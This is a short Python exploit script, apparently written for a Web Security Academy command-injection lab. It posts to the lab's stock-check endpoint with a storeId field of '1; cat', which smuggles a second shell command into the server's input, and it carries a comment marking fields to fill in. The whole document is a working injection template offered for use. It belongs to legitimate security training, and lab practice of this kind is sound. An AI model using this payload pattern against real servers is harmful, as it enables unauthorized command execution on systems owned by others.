# <FMI> (Fill Me In) denotes a field you must modify
import requests

s = requests.Session()
stock_post_url = 'https://0af3007c04c085c5833506280005006b.web-security-academy.net/product?productId=1'
post_data = {
    'productId' : '1',
    'storeId' : '1; cat'
}
resp = s.post(stock_post_url, data=post_data)
print(resp.text)